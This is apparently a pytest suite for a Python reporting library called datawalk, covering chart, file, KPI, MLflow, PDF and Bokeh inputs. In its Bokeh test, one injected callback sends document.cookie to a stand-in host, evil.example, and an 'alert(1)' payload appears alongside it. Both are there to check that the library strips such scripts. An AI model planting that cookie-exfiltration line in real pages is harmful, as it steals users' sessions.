import json
from pathlib import Path

import matplotlib.pyplot as plt
import pandas as pd
import pytest
from matplotlib.backends.backend_pdf import PdfPages

import datawalk as dw
from datawalk import export as ex


def test_altair_chart_is_interactive_vegalite():
    alt = pytest.importorskip("altair")
    df = pd.DataFrame({"x": [1, 2, 3], "y": [3, 1, 2]})
    chart = alt.Chart(df, title="Small").mark_line().encode(x="x", y=alt.Y("y", title="Value"))
    r = dw.Report("r")
    v = r.add(chart, key="alt")
    assert (v.source.library, v.source.chart_type, v.source.mode) == (
        "vega-lite",
        "line",
        "interactive",
    )
    assert v.name == "Small" and v.source.axes[0].y.label == "Value"
    payload = r._payloads[v.id]
    assert payload["kind"] == "vegalite" and ex.point_count(payload) == 3
    url = r.add(alt.Chart("https://example.org/data.csv").mark_bar().encode(x="a:Q"), key="url")
    assert "URL" in url.source.limitations[0]


def test_styler_keeps_values_not_styles():
    df = pd.DataFrame({"a": [1.5, 2.25]})
    r = dw.Report("r")
    v = r.add(df.style.format("{:.0f}").set_caption("Styled"), key="s")
    assert v.name == "Styled" and r._payloads[v.id]["rows"] == [[1.5], [2.25]]
    assert "not kept" in v.source.limitations[-1]


def test_files(tmp_path):
    fig, ax = plt.subplots(figsize=(4, 2))
    ax.plot([1, 2])
    fig.savefig(tmp_path / "trend_line.png")
    fig.savefig(tmp_path / "photo.jpg")
    fig.savefig(tmp_path / "vector.svg")
    (tmp_path / "data.csv").write_text("month,revenue\n2025-01,10\n2025-02,12\n")
    pd.DataFrame({"k": ["a"], "v": [1]}).to_excel(tmp_path / "book.xlsx", index=False)
    (tmp_path / "agenda.md").write_text("# Agenda\n\n- Results\n- Next steps\n")
    (tmp_path / "plot.json").write_text(
        json.dumps(
            {"data": [{"type": "bar", "y": [1, 2]}], "layout": {"title": {"text": "From R"}}}
        )
    )
    (tmp_path / "vl.json").write_text(
        json.dumps(
            {
                "$schema": "https://vega.github.io/schema/vega-lite/v5.json",
                "mark": "point",
                "data": {"values": [{"a": 1}]},
            }
        )
    )
    (tmp_path / "other.json").write_text("{}")
    r = dw.Report("files")
    png = r.add(tmp_path / "trend_line.png", key="png")
    assert (png.source.mode, png.name, png.source.has_preview) == ("static", "Trend line", True)
    assert png.source.provenance.kind == "file" and len(png.source.provenance.sha256) == 64
    jpg = r.add(tmp_path / "photo.jpg", key="jpg")
    assert r._previews[jpg.id].startswith(b"\x89PNG")  # converted for the viewer
    svg = r.add(tmp_path / "vector.svg", key="svg")
    assert r._payloads[svg.id]["kind"] == "svg" and svg.source.mode == "static"
    csv = r.add(tmp_path / "data.csv", key="csv")
    assert r._payloads[csv.id]["rows"] == [["2025-01", 10], ["2025-02", 12]]
    xlsx = r.add(tmp_path / "book.xlsx", key="xlsx")
    assert r._payloads[xlsx.id]["columns"] == ["k", "v"]
    md = r.add(tmp_path / "agenda.md", key="md")
    assert r._payloads[md.id]["markdown"].startswith("# Agenda") and md.source.chart_type == "text"
    assert r.add(tmp_path / "plot.json", key="pj").name == "From R"
    assert r.add(tmp_path / "vl.json", key="vl").source.library == "vega-lite"
    with pytest.raises(ValueError, match="not a Plotly"):
        r.add(tmp_path / "other.json", key="bad")
    r.save(tmp_path / "files.dwk")  # every payload kind passes the archive validation
    assert dw.Report.load(tmp_path / "files.dwk").get("svg").source.library == "svg"


def test_kpis_by_explicit_mapping(tmp_path):
    path = tmp_path / "sales.csv"
    path.write_text("month,revenue,returns\n1,10,1\n2,12,\n3,15,2\n")
    r = dw.Report("k")
    a, b, c = r.add_kpis(
        path,
        {
            "rev_total": {"label": "Revenue", "column": "revenue", "agg": "sum", "unit": "k"},
            "rev_last": {"label": "Last month", "column": "revenue", "delta_row": -2},
            "returns": {
                "label": "Returns",
                "column": "returns",
                "agg": "max",
                "higher_is_better": False,
            },
        },
        room="KPIs",
    )
    assert r._payloads[a.id]["value"] == 37 and r._payloads[a.id]["unit"] == "k"
    assert r._payloads[b.id]["value"] == 15 and r._payloads[b.id]["delta"] == 3
    assert r._payloads[c.id]["value"] == 2.0 and a.source.provenance.path == str(path)
    with pytest.raises(ValueError, match="no column"):
        r.add_kpis(path, {"x": {"column": "nope"}})
    # A typo, text in a sum, a missing row, or a key that exists: an error, not a wrong number.
    with pytest.raises(ValueError, match="unknown setting agregation"):
        r.add_kpis(path, {"x": {"column": "revenue", "agregation": "sum"}})
    with pytest.raises(ValueError, match="needs numbers"):
        r.add_kpis(pd.DataFrame({"m": ["a", "b"]}), {"x": {"column": "m", "agg": "sum"}})
    with pytest.raises(ValueError, match="row 9 does not exist"):
        r.add_kpis(path, {"x": {"column": "revenue", "row": 9}})
    with pytest.raises(ValueError, match="Duplicate key"):
        r.add_kpis(path, {"rev_total": {"column": "revenue"}})


def test_mlflow_run_directory(tmp_path):
    run = tmp_path / "mlruns" / "1" / "abc123"
    (run / "metrics").mkdir(parents=True)
    (run / "params").mkdir()
    (run / "artifacts").mkdir()
    (run / "meta.yaml").write_text("run_id: abc123\nrun_name: baseline-run\n")
    (run / "metrics" / "auc").write_text("1700000000 0.61 0\n1700000001 0.66 1\n")
    (run / "params" / "lr").write_text("0.01")
    fig, ax = plt.subplots()
    ax.plot([1, 2])
    fig.savefig(run / "artifacts" / "loss.png")
    r = dw.Report("m")
    added = r.add_mlflow_run(run)
    keys = {v.key for v in added}
    assert keys == {"baseline_run.auc", "baseline_run.params", "baseline_run.artifact.loss.png"}
    auc = r.get("baseline_run.auc")
    assert r._payloads[auc.id]["value"] == 0.66 and r._payloads[auc.id]["delta"] == pytest.approx(
        0.05
    )
    assert r.room("baseline-run").items and auc.source.provenance.kind == "mlflow"


def test_pdf_pages(tmp_path):
    pytest.importorskip("pypdfium2")
    path = tmp_path / "bi_export.pdf"
    with PdfPages(path) as pdf:
        for n in range(2):
            fig, ax = plt.subplots()
            ax.set_title(f"Page {n + 1}")
            pdf.savefig(fig)
    r = dw.Report("p")
    pages = r.add_pdf(path, room="BI")
    assert [p.key for p in pages] == ["bi_export.page1", "bi_export.page2"]
    assert pages[0].source.mode == "static" and r._previews[pages[0].id].startswith(b"\x89PNG")
    assert pages[1].source.provenance.path.endswith("#page=2")


def test_point_count_of_new_payloads():
    assert ex.point_count({"kind": "text", "markdown": "x", "links": []}) == 0
    assert ex.point_count({"kind": "svg", "svg": "<svg/>"}) == 0
    spec = {"datasets": {"d": [{}, {}]}, "layer": [{"data": {"values": [{}]}}]}
    assert ex.point_count({"kind": "vegalite", "spec": spec}) == 3


def test_example_files_exist():
    assert (Path(__file__).parents[1] / "examples" / "notebook" / "retail_analysis.ipynb").exists()


def test_bokeh_adapter_server_and_export(tmp_path):
    bokeh = pytest.importorskip("bokeh")
    from bokeh.plotting import figure
    from fastapi.testclient import TestClient

    from datawalk.server import create_app

    f = figure(title="Latency", width=400, height=200, x_axis_label="hour", y_axis_label="ms")
    f.line([1, 2, 3], [5, 6, 4])
    r = dw.Report("b")
    v = r.add(f, key="bk")
    assert (v.source.library, v.source.chart_type, v.source.mode, v.name) == (
        "bokeh",
        "line",
        "interactive",
        "Latency",
    )
    assert v.source.aspect == 2 and ex.point_count(r._payloads[v.id]) == 3
    client = TestClient(create_app(r), base_url="http://127.0.0.1")
    js = client.get(f"/api/vendor/bokeh/{bokeh.__version__}/bokeh.min.js")
    assert js.status_code == 200 and js.headers["content-type"].startswith("text/javascript")
    assert client.get("/api/vendor/bokeh/0.0.1/bokeh.min.js").status_code == 404
    assert client.get(f"/api/vendor/bokeh/{bokeh.__version__}/evil.min.js").status_code == 404
    # JavaScript callbacks never travel with a report: not from Python, not from an archive.
    from bokeh.models import CustomJS, HTMLTemplateFormatter

    f.js_on_event("tap", CustomJS(code="fetch('https://evil.example/' + document.cookie)"))
    f.js_on_event("tap", CustomJS(args={"f": HTMLTemplateFormatter(template="<%= 1 %>")}, code="1"))
    v2 = r.add(f, key="bk2")
    text = json.dumps(r._payloads[v2.id])
    assert "evil.example" not in text and "<%= 1 %>" not in text and "<%- value %>" in text
    assert any("CustomJS" in note for note in v2.source.limitations)
    item = json.loads(text.replace('"code": ""', '"code": "alert(1)"'))
    from datawalk.core.models import BokehPayload

    assert "alert" not in json.dumps(BokehPayload(item=item, version=bokeh.__version__).item)
    if (ex.STATIC / "library" / "index.json").exists() and (ex.VIEWER / "viewer.js").exists():
        html = ex.render_html(ex.prepare(r))
        csp = html[html.index("Content-Security-Policy") : html.index("<title>")]
        assert csp.count("'sha256-") == 2 + 4  # data, viewer, and four BokehJS scripts
        assert "Bokeh" in html and "vendor/bokeh" not in html.split("__DATAWALK_ASSETS__")[1][:200]
